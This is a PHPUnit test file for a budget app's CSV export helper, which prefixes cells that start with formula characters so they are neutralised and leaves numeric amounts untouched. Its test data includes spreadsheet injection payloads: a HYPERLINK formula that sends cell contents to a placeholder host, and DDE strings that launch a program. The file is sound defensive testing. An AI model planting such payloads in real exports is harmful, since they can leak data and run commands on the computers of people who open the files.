<?php

declare(strict_types=1);

namespace OCA\Budget\Tests\Unit\Service\Export;

use OCA\Budget\Service\Export\CsvSafe;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

class CsvSafeTest extends TestCase {
    public static function formulaCells(): array {
        return [
            'equals' => ['=HYPERLINK("http://x/?"&A1,"Click")'],
            'plus' => ['+cmd|\' /C calc\'!A0'],
            'minus' => ['-2+3+cmd|\' /C calc\'!A0'],
            'at' => ['@SUM(A1:A9)'],
            'tab' => ["\t=1+1"],
            'carriage return' => ["\r=1+1"],
        ];
    }

    #[DataProvider('formulaCells')]
    public function testTextThatASpreadsheetWouldExecuteIsNeutralised(string $cell): void {
        $this->assertSame("'" . $cell, CsvSafe::cell($cell));
    }

    public static function numericCells(): array {
        return [
            'negative amount' => ['-12.50'],
            'positive signed amount' => ['+12.50'],
            'thousands' => ['-1,234.56'],
            'percentage change' => ['-3.5%'],
            'signed percentage' => ['+12%'],
            'exponent' => ['-1e5'],
            'no-value placeholder' => ['-'],
        ];
    }

    /**
     * An amount must stay a number the user can total, so a purely numeric
     * cell is never prefixed, whatever its sign.
     */
    #[DataProvider('numericCells')]
    public function testNumbersAreLeftAlone(string $cell): void {
        $this->assertSame($cell, CsvSafe::cell($cell));
    }

    public function testOrdinaryTextAndNonStringsPassThrough(): void {
        $this->assertSame('Weekly shop', CsvSafe::cell('Weekly shop'));
        $this->assertSame('a=b', CsvSafe::cell('a=b'));
        $this->assertSame('', CsvSafe::cell(''));
        $this->assertSame(-12.5, CsvSafe::cell(-12.5));
        $this->assertSame(-3, CsvSafe::cell(-3));
        $this->assertNull(CsvSafe::cell(null));
    }

    public function testPutWritesTheNeutralisedRow(): void {
        $handle = fopen('php://memory', 'w+');
        CsvSafe::put($handle, ['=1+1', '-12.50', 'Tesco']);
        rewind($handle);
        $line = stream_get_contents($handle);
        fclose($handle);

        $this->assertSame("'=1+1,-12.50,Tesco\n", $line);
    }
}
